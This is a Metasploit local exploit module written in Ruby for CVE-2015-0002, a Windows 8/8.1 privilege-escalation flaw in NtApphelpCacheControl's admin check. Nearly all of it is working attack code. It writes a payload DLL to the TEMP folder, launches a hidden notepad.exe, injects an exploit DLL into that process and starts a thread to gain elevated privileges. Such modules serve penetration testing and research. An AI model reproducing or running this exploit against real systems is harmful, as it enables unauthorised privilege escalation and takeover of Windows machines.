##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/windows/reflective_dll_injection'

class Metasploit3 < Msf::Exploit::Local
  Rank = NormalRanking

  include Exploit::EXE
  include Msf::Post::File
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super(update_info(info, {
      'Name'           => 'Microsoft Windows NtApphelpCacheControl Improper Authorization Check',
      'Description'    => %q{
        On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys)
        allows application compatibility data to be cached for quick reuse when new processes are
        created. A normal user can query the cache but cannot add new cached entries as the
        operation is restricted to administrators. This is checked in the function
        AhcVerifyAdminContext.

        This function has a vulnerability where it doesn't correctly check the impersonation token
        of the caller to determine if the user is an administrator. It reads the caller's
        impersonation token using PsReferenceImpersonationToken and then does a comparison between
        the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level
        of the token so it's possible to get an identify token on your thread from a local system
        process and bypass this check.

        This module currently only affects Windows 8 and Windows 8.1, and requires access to
        C:\Windows\System\ComputerDefaults.exe (although this can be improved).
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'James Forshaw',
          'sinn3r'
        ],
      'Platform'       => 'win',
      'SessionTypes'   => [ 'meterpreter' ],
      'Arch'           => [ARCH_X86, ARCH_X86_64],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'thread',
        },
      'Targets'        =>
        [
          [ 'Windows 8 / Windows 8.1 (x86 and x64)', {} ]
        ],
      'DefaultTarget'  => 0,
      'Payload'        =>
        {
          'Space'       => 4096,
          'DisableNops' => true
        },
      'References'     =>
        [
          [ 'CVE', '2015-0002' ],
          [ 'OSVEB', '116497' ],
          [ 'EDB', '35661' ],
          [ 'URL', 'https://code.google.com/p/google-security-research/issues/detail?id=118']
        ],
      'DisclosureDate' => 'Sep 30 2014'
    }))
  end

  def temp
    @temp ||= get_env('TEMP').to_s
  end

  def payload_filepath
    @payload_filepath ||= "#{temp}\\#{Rex::Text.rand_text_alpha(6)}.dll"
  end

  def upload_payload_dll(payload_filepath)
    payload = generate_payload_dll({:dll_exitprocess => true})
    begin
      write_file(payload_filepath, payload)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(
          Failure::Unknown,
          "Error uploading file #{payload_filepath}: #{e.class} #{e}"
      )
    end
  end

  def upload_payload
    print_status("Payload DLL will be: #{payload_filepath}")

    # Upload the payload
    upload_payload_dll(payload_filepath)
    if !file?(payload_filepath)
      fail_with(Failure::Unknown, "Failed to save the payload DLL, or got removed. No idea why.")
    end
  end

  def inject_exploit(process)
    lib_file_path = ::File.join(
      Msf::Config.data_directory, "exploits", "ntapphelpcachecontrol", 'exploit.dll'
    )

    print_status("Creating thread")
    exploit_mem, offset = inject_dll_into_process(process, lib_file_path)
    var_mem = inject_into_process(process, payload_filepath)
    process.thread.create(exploit_mem + offset, var_mem)
  end

  def prep_exploit_host
    process = nil
    notepad_process = client.sys.process.execute('notepad.exe', nil, {'Hidden' => true})
    begin
      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)
    rescue Rex::Post::Meterpreter::RequestError
      process = client.sys.process.open
    rescue ::Exception => e
      elog("#{e.message}\nCall stack:\n#{e.backtrace.join("\n")}")
    end
    process
  end

  def check
    if sysinfo['OS'] =~ /Windows 8/
      # Still an 0day, but since this check doesn't actually trigger the vulnerability
      # so we should only flag this as CheckCode::Appears
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    if session.platform !~ /^x86\//
      print_error("Sorry, this module currently only allows x86/win32 sessions.")
      print_error("You will have to get a x86/win32 session first, and then you can")
      print_error("select a x64 payload as this exploit's payload.")
      return
    end

    print_status("Uploading the payload DLL")
    upload_payload

    proc = prep_exploit_host
    if !proc
      fail_with(Failure::Unknown, "Fail to get a notepad.exe to run (to host the exploit)")
    end

    print_status("Injecting exploit into PID #{proc.pid}")
    inject_exploit(proc)
  end


end
